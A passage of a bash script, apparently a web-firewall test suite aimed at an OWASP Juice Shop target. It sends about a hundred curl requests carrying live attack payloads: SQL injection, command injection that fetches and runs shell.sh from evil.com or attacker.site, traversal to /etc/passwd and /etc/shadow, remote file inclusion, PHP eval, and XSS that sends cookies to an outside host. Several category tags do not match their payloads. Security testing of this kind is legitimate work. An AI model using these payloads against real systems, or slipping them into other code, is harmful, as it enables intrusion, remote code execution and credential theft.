printf '    payload: %s\n' '1%a0OR%a01=1'
curl -sk -i -m 15 "$HOST$URI?q=1%25a0OR%25a01%3D1" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0102 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\''/*!50000OR*/'\''1'\''='\''1'
curl -sk -i -m 15 "$HOST$URI?q=1%27%2F%2A%2150000OR%2A%2F%271%27%3D%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0103 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1/**/UNION/**/SELECT/**/version()--'
curl -sk -i -m 15 "$HOST$URI?q=1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fversion%28%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0104 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' ''\''#'
curl -sk -i -m 15 "$HOST$URI?q=%27%23" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0105 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' 'admin'\''--'
curl -sk -i -m 15 "$HOST$URI?q=admin%27--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0106 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' AND sleep(5)--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20AND%20sleep%285%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0107 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR 1=1 LIMIT 1 OFFSET 1--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%201%3D1%20LIMIT%201%20OFFSET%201--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0108 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''||UTL_INADDR.get_host_address('\''evil.com'\'')||'
curl -sk -i -m 15 "$HOST$URI?q=%27%7C%7CUTL_INADDR.get_host_address%28%27evil.com%27%29%7C%7C" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0109 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''/*!50000UNION*/ SELECT 1,2--'
curl -sk -i -m 15 "$HOST$URI?q=%27%2F%2A%2150000UNION%2A%2F%20SELECT%201%2C2--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0110 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''UNION SELECT /*!12345null*/,version()#'
curl -sk -i -m 15 "$HOST$URI?q=%27UNION%20SELECT%20%2F%2A%2112345null%2A%2F%2Cversion%28%29%23" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0111 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' /*!OR*/ '\''1'\''='\''1'
curl -sk -i -m 15 "$HOST$URI?q=%27%20%2F%2A%21OR%2A%2F%20%271%27%3D%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0112 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR 1=1-- -'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%201%3D1--%20-" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0113 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\'' OR '\''1'\''='\''1'\'' --+'
curl -sk -i -m 15 "$HOST$URI?q=1%27%20OR%20%271%27%3D%271%27%20--%2B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0114 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR 1=1;--+'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%201%3D1%3B--%2B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0115 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27%20OR%201%3D1--+'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2520OR%25201%253D1--%2B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0116 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27/*!UNION*/%20SELECT%201,2--'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2F%2A%21UNION%2A%2F%2520SELECT%25201%2C2--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0117 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%2527%2520OR%25201%253D1%2520--'
curl -sk -i -m 15 "$HOST$URI?q=%252527%252520OR%2525201%25253D1%252520--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0118 | tuning=cmdi | method=GET-querystring ==="
printf '    payload: %s\n' ';`id`'
curl -sk -i -m 15 "$HOST$URI?q=%3B%60id%60" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0119 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%26%26sleep%205'
curl -sk -i -m 15 "$HOST$URI?q=%2526%2526sleep%25205" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0120 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%26%26cat%20/etc/passwd'
curl -sk -i -m 15 "$HOST$URI?q=%2526%2526cat%2520%2Fetc%2Fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0121 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%3Bping%20-c%204%20evil.com'
curl -sk -i -m 15 "$HOST$URI?q=%253Bping%2520-c%25204%2520evil.com" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0122 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%60whoami%60'
curl -sk -i -m 15 "$HOST$URI?q=%2560whoami%2560" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0123 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '|curl$\{IFS\}evil.com'
curl -sk -i -m 15 "$HOST$URI?q=%7Ccurl%24%5C%7BIFS%5C%7Devil.com" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0124 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '|wget$\{IFS\}attacker.site%2fshell.sh'
curl -sk -i -m 15 "$HOST$URI?q=%7Cwget%24%5C%7BIFS%5C%7Dattacker.site%252fshell.sh" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0125 | tuning=cmdi | method=GET-querystring ==="
printf '    payload: %s\n' '%2526%2526whoami'
curl -sk -i -m 15 "$HOST$URI?q=%252526%252526whoami" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0126 | tuning=cmdi | method=GET-querystring ==="
printf '    payload: %s\n' '$\{@print(md5(1234))\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7B%40print%28md5%281234%29%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0127 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' 'php://input'
curl -sk -i -m 15 "$HOST$URI?q=php%3A%2F%2Finput" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0128 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' ''\'';phpinfo();/*'
curl -sk -i -m 15 "$HOST$URI?q=%27%3Bphpinfo%28%29%3B%2F%2A" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0129 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' 'eval(base64_decode($_GET[cmd]))'
curl -sk -i -m 15 "$HOST$URI?q=eval%28base64_decode%28%24_GET%5Bcmd%5D%29%29" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0130 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' 'system($_GET['\''cmd'\''])'
curl -sk -i -m 15 "$HOST$URI?q=system%28%24_GET%5B%27cmd%27%5D%29" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0131 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%60curl$\{IFS\}attacker.com%60'
curl -sk -i -m 15 "$HOST$URI?q=%2560curl%24%5C%7BIFS%5C%7Dattacker.com%2560" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0132 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' ''\'';`wget attacker.sh`;//'
curl -sk -i -m 15 "$HOST$URI?q=%27%3B%60wget%20attacker.sh%60%3B%2F%2F" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0133 | tuning=cmdi | method=GET-querystring ==="
printf '    payload: %s\n' ';id'
curl -sk -i -m 15 "$HOST$URI?q=%3Bid" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0134 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '| whoami'
curl -sk -i -m 15 "$HOST$URI?q=%7C%20whoami" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0135 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '`whoami`'
curl -sk -i -m 15 "$HOST$URI?q=%60whoami%60" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0136 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '& uname -a'
curl -sk -i -m 15 "$HOST$URI?q=%26%20uname%20-a" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0137 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&& ping -c 3 attacker.com'
curl -sk -i -m 15 "$HOST$URI?q=%26%26%20ping%20-c%203%20attacker.com" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0138 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '| powershell -Command "whoami"'
curl -sk -i -m 15 "$HOST$URI?q=%7C%20powershell%20-Command%20%22whoami%22" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0139 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '; curl http://evil.com/shell.sh | sh'
curl -sk -i -m 15 "$HOST$URI?q=%3B%20curl%20http%3A%2F%2Fevil.com%2Fshell.sh%20%7C%20sh" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0140 | tuning=cmdi | method=GET-querystring ==="
printf '    payload: %s\n' '$\{@print(md5(1))\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7B%40print%28md5%281%29%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0141 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%26%26%20whoami'
curl -sk -i -m 15 "$HOST$URI?q=%2526%2526%2520whoami" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0142 | tuning=cmdi | method=GET-querystring ==="
printf '    payload: %s\n' '%3B%20id'
curl -sk -i -m 15 "$HOST$URI?q=%253B%2520id" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0143 | tuning=cmdi | method=GET-querystring ==="
printf '    payload: %s\n' '%60uname%20-a%60'
curl -sk -i -m 15 "$HOST$URI?q=%2560uname%2520-a%2560" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0144 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '|c%75rl http://evil.com'
curl -sk -i -m 15 "$HOST$URI?q=%7Cc%2575rl%20http%3A%2F%2Fevil.com" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0145 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$IFS$9$IFS$9whoami'
curl -sk -i -m 15 "$HOST$URI?q=%24IFS%249%24IFS%249whoami" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0146 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' ';& whoami'
curl -sk -i -m 15 "$HOST$URI?q=%3B%26%20whoami" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0147 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '../../../../../../etc/passwd'
curl -sk -i -m 15 "$HOST$URI?q=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0148 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
curl -sk -i -m 15 "$HOST$URI?q=..%252f..%252f..%252f..%252f..%252fetc%252fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0149 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '....//....//....//etc/passwd'
curl -sk -i -m 15 "$HOST$URI?q=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0150 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
curl -sk -i -m 15 "$HOST$URI?q=%252e%252e%252f%252e%252e%252fetc%252fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0151 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%252e%252e%252fetc%252fpasswd'
curl -sk -i -m 15 "$HOST$URI?q=%25252e%25252e%25252fetc%25252fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0152 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' 'php://filter/convert.base64-encode/resource=index.php'
curl -sk -i -m 15 "$HOST$URI?q=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0153 | tuning=lfi | method=GET-querystring ==="
printf '    payload: %s\n' 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
curl -sk -i -m 15 "$HOST$URI?q=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgcGhwaW5mbygpOyA%2FPg%3D%3D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0154 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '../../../../etc/passwd'
curl -sk -i -m 15 "$HOST$URI?q=..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0155 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '../../../boot.ini'
curl -sk -i -m 15 "$HOST$URI?q=..%2F..%2F..%2Fboot.ini" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0156 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '../../../../../../windows/win.ini'
curl -sk -i -m 15 "$HOST$URI?q=..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0157 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '../.../.../.../.../.../.../etc/shadow'
curl -sk -i -m 15 "$HOST$URI?q=..%2F...%2F...%2F...%2F...%2F...%2F...%2Fetc%2Fshadow" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0158 | tuning=lfi | method=GET-querystring ==="
printf '    payload: %s\n' 'expect://id'
curl -sk -i -m 15 "$HOST$URI?q=expect%3A%2F%2Fid" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0159 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '../../../../../../etc/passwd%00'
curl -sk -i -m 15 "$HOST$URI?q=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0160 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '..%2f..%2f..%2f..%2fetc%2fpasswd'
curl -sk -i -m 15 "$HOST$URI?q=..%252f..%252f..%252f..%252fetc%252fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0161 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '..%252f..%252f..%252fetc%252fpasswd'
curl -sk -i -m 15 "$HOST$URI?q=..%25252f..%25252f..%25252fetc%25252fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0162 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '..//..//..//etc//passwd'
curl -sk -i -m 15 "$HOST$URI?q=..%2F%2F..%2F%2F..%2F%2Fetc%2F%2Fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0163 | tuning=lfi | method=GET-querystring ==="
printf '    payload: %s\n' '..%c0%af..%c0%afetc%c0%afpasswd'
curl -sk -i -m 15 "$HOST$URI?q=..%25c0%25af..%25c0%25afetc%25c0%25afpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0164 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '....//....//etc/passwd'
curl -sk -i -m 15 "$HOST$URI?q=....%2F%2F....%2F%2Fetc%2Fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0165 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '..%c0%af..%c0%afetc%2fpasswd'
curl -sk -i -m 15 "$HOST$URI?q=..%25c0%25af..%25c0%25afetc%252fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0166 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '../../../etc/passwd'
curl -sk -i -m 15 "$HOST$URI?q=..%2F..%2F..%2Fetc%2Fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0167 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
curl -sk -i -m 15 "$HOST$URI?q=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0168 | tuning=rfi | method=GET-querystring ==="
printf '    payload: %s\n' 'http://evil.com/shell.txt'
curl -sk -i -m 15 "$HOST$URI?q=http%3A%2F%2Fevil.com%2Fshell.txt" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0169 | tuning=rfi | method=GET-querystring ==="
printf '    payload: %s\n' '%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt'
curl -sk -i -m 15 "$HOST$URI?q=%2568%2574%2574%2570%253a%252f%252fattacker.com%252fcode.txt" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0170 | tuning=rfi | method=GET-querystring ==="
printf '    payload: %s\n' 'https://evil.com/backdoor.php'
curl -sk -i -m 15 "$HOST$URI?q=https%3A%2F%2Fevil.com%2Fbackdoor.php" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0171 | tuning=rfi | method=GET-querystring ==="
printf '    payload: %s\n' '%252f%252fmalicious.com%252fshell.txt'
curl -sk -i -m 15 "$HOST$URI?q=%25252f%25252fmalicious.com%25252fshell.txt" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0172 | tuning=rfi | method=GET-querystring ==="
printf '    payload: %s\n' '%5c%5cattacker.com%5cbackdoor.txt'
curl -sk -i -m 15 "$HOST$URI?q=%255c%255cattacker.com%255cbackdoor.txt" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0173 | tuning=rfi | method=GET-querystring ==="
printf '    payload: %s\n' 'https://attacker.site/malware.php'
curl -sk -i -m 15 "$HOST$URI?q=https%3A%2F%2Fattacker.site%2Fmalware.php" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0174 | tuning=rfi | method=GET-querystring ==="
printf '    payload: %s\n' 'http://evil.com/shell.txt?'
curl -sk -i -m 15 "$HOST$URI?q=http%3A%2F%2Fevil.com%2Fshell.txt%3F" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0175 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' 'http://127.0.0.1/evil.txt'
curl -sk -i -m 15 "$HOST$URI?q=http%3A%2F%2F127.0.0.1%2Fevil.txt" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0176 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' 'http://[::]/evil.php'
curl -sk -i -m 15 "$HOST$URI?q=http%3A%2F%2F%5B%3A%3A%5D%2Fevil.php" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0177 | tuning=rfi | method=GET-querystring ==="
printf '    payload: %s\n' 'http%3A%2F%2Fevil.com%2Fshell.txt'
curl -sk -i -m 15 "$HOST$URI?q=http%253A%252F%252Fevil.com%252Fshell.txt" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0178 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' 'http%3A%2F%2F127.0.0.1%2Fevil.txt'
curl -sk -i -m 15 "$HOST$URI?q=http%253A%252F%252F127.0.0.1%252Fevil.txt" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0179 | tuning=rfi | method=GET-querystring ==="
printf '    payload: %s\n' 'http://evil.com%00/shell.php'
curl -sk -i -m 15 "$HOST$URI?q=http%3A%2F%2Fevil.com%2500%2Fshell.php" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0180 | tuning=rfi | method=GET-querystring ==="
printf '    payload: %s\n' 'http://evil.com//shell.txt'
curl -sk -i -m 15 "$HOST$URI?q=http%3A%2F%2Fevil.com%2F%2Fshell.txt" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0181 | tuning=rfi | method=GET-querystring ==="
printf '    payload: %s\n' 'http://ev%69l.com/shell.php'
curl -sk -i -m 15 "$HOST$URI?q=http%3A%2F%2Fev%2569l.com%2Fshell.php" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0182 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' 'eval(String.fromCharCode(97,108,101,114,116,40,49,41))'
curl -sk -i -m 15 "$HOST$URI?q=eval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0183 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' 'new%20Function('\''alert(1)'\'')()'
curl -sk -i -m 15 "$HOST$URI?q=new%2520Function%28%27alert%281%29%27%29%28%29" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0184 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' 'setTimeout('\''%61lert(1)'\'',1000)'
curl -sk -i -m 15 "$HOST$URI?q=setTimeout%28%27%2561lert%281%29%27%2C1000%29" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0185 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' 'document['\''write'\'']('\''<img src=x onerror=alert(1)>'\'')'
curl -sk -i -m 15 "$HOST$URI?q=document%5B%27write%27%5D%28%27%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%27%29" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0186 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<img src="x" onerror="alert(1)">'
curl -sk -i -m 15 "$HOST$URI?q=%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0187 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<a href="javascript:alert(1)">XSS</a>'
curl -sk -i -m 15 "$HOST$URI?q=%3Ca%20href%3D%22javascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0188 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<body onload="alert(1)">'
curl -sk -i -m 15 "$HOST$URI?q=%3Cbody%20onload%3D%22alert%281%29%22%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0189 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>document.write('\''<img src="http://example.com/xss.png?c='\'' + document.cookie + '\''">'\'')</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22http%3A%2F%2Fexample.com%2Fxss.png%3Fc%3D%27%20%2B%20document.cookie%20%2B%20%27%22%3E%27%29%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0190 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Eeval%28String.fromCharCode%2897%2C%20108%2C%20101%2C%20114%2C%20116%2C%2040%2C%2049%2C%2041%29%29%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0191 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<img src="x" onerror="eval(atob('\''YWxlcnQoMSk='\''))">'
curl -sk -i -m 15 "$HOST$URI?q=%3Cimg%20src%3D%22x%22%20onerror%3D%22eval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%22%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0192 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";a.click();</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Evar%20a%3Ddocument.createElement%28%22a%22%29%3Ba.href%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3Ba.click%28%29%3B%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0193 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>var s=document.createElement("script");s.src="http://example.com/xss.js";document.body.appendChild(s);</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Evar%20s%3Ddocument.createElement%28%22script%22%29%3Bs.src%3D%22http%3A%2F%2Fexample.com%2Fxss.js%22%3Bdocument.body.appendChild%28s%29%3B%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0194 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>var i=new Image();i.src="http://example.com/xss.png?c="+document.cookie;document.body.appendChild(i);</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Evar%20i%3Dnew%20Image%28%29%3Bi.src%3D%22http%3A%2F%2Fexample.com%2Fxss.png%3Fc%3D%22%2Bdocument.cookie%3Bdocument.body.appendChild%28i%29%3B%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0195 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>fetch("http://example.com/xss.php?c="+document.cookie);</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Efetch%28%22http%3A%2F%2Fexample.com%2Fxss.php%3Fc%3D%22%2Bdocument.cookie%29%3B%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0196 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>var x=new XMLHttpRequest();x.open("GET","http://example.com/xss.php?c="+document.cookie,true);x.send();</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest%28%29%3Bx.open%28%22GET%22%2C%22http%3A%2F%2Fexample.com%2Fxss.php%3Fc%3D%22%2Bdocument.cookie%2Ctrue%29%3Bx.send%28%29%3B%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0197 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>var s=document.createElement("iframe");s.src="http://example.com/xss.php?c="+document.cookie;document.body.appendChild(s);</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Evar%20s%3Ddocument.createElement%28%22iframe%22%29%3Bs.src%3D%22http%3A%2F%2Fexample.com%2Fxss.php%3Fc%3D%22%2Bdocument.cookie%3Bdocument.body.appendChild%28s%29%3B%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0198 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>var l=document.createElement("link");l.rel="stylesheet";l.href="http://example.com/xss.css";document.head.appendChild(l);</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Evar%20l%3Ddocument.createElement%28%22link%22%29%3Bl.rel%3D%22stylesheet%22%3Bl.href%3D%22http%3A%2F%2Fexample.com%2Fxss.css%22%3Bdocument.head.appendChild%28l%29%3B%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0199 | tuning=xss | method=GET-querystring ==="
